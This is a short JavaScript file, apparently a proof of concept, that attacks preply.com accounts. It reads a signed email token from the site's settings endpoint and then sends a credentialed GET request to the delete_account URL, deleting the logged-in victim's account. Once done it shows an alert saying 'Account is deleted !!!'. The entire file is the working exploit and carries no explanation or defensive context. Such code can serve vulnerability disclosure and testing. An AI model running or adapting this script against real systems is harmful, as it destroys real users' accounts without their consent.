pre_url = "https://preply.com/settings_initial_data/"
delete_url = "https://preply.com/en/delete_account/"

function delete_completed() {
  alert("Account is deleted !!!");
}

function submit_delete(signed_email) {
  req = new XMLHttpRequest();
  req.open('GET', delete_url+signed_email, true);
  req.withCredentials = true;
  req.onload = function () {
    delete_completed();
  };
  req.send(null);

}

req = new XMLHttpRequest();
req.responseType = 'json';
req.open('GET', pre_url, true);
req.onload = function () {
  var jsonResponse = req.response;
  signed_email = jsonResponse.signed_email.split(":")[1];
  submit_delete(signed_email)
};
req.send(null);
